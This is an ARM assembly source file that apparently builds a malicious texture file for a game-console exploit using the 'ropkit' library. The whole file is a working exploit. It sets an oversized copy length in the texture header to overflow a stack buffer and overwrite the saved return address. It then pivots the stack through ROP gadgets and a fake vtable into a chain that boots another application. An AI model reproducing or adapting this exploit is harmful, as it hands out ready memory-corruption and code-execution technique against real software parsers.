.arm
.section .init
.global _start

_start:

//Define TARGET_STACKFRAME_BEFORELROVERWRITE_SIZE: Byte-size needed to overwrite data on the stack right before saved LR.

#include "ropkit_ropinclude.s"

#ifdef STACKPIVOT_ADR0
	#define STACKPIVOT_ADR STACKPIVOT_ADR0
#else
	#ifdef STACKPIVOT_ADR1
		#define STACKPIVOT_ADR STACKPIVOT_ADR1
	#else
		#error STACKPIVOT_ADR* not defined.
	#endif
#endif

#define STACKPIVOT_PREPAREREGS_SIZE 0x10
#define STACKPIVOT_JUMP_SIZE 0x4

.macro ROPMACRO_STACKPIVOT_PREPAREREGS_BEFOREJUMP
.word POP_R4R5R6PC
.word ROPBUFLOC(stackpivot_pcloadword+4) @ r4
.word 0 @ r5
.word ROPBUFLOC(stackpivot_pcloadword+4) @ r6
.endm

.macro ROPMACRO_STACKPIVOT_JUMP
.word STACKPIVOT_ADR
.endm

.word 0x4b505443 @ +0x0 u32: Magicnum 0x13304f6.
.hword 0x1
.hword 0x1 @ Total textures.
.word 0 @ Offset for texture data base.

.space ((_start + 0x20) - .) @ Entry for the first texture, 0x20-bytes per entry.
.word 0, 0, 0, 0, 0
.word (TARGET_STACKFRAME_BEFORELROVERWRITE_SIZE+(STACKPIVOT_PREPAREREGS_SIZE+STACKPIVOT_JUMP_SIZE))>>2 @ u8size, total size to copy in words.
.word 0x40>>2 @ Absolute offset for the srcdataptr, in words.
.word 0

@ Start of the data copied to stack.
.space TARGET_STACKFRAME_BEFORELROVERWRITE_SIZE

@ This is where the initial saved-LR-overwrite is located.
ROPMACRO_STACKPIVOT_PREPAREREGS_BEFOREJUMP
ROPMACRO_STACKPIVOT_JUMP

ropstackstart:
#include "ropkit_boototherapp.s"

stackpivot_sploadword:
.word ROPBUFLOC(ropstackstart)

.word 0 @ lr

stackpivot_pcloadword:
.word ROP_POPPC

ropkit_cmpobject:
.word (ROPBUFLOC(ropkit_cmpobject) + 0x4) @ Vtable-ptr
.fill (0x40 / 4), 4, STACKPIVOT_ADR @ Vtable

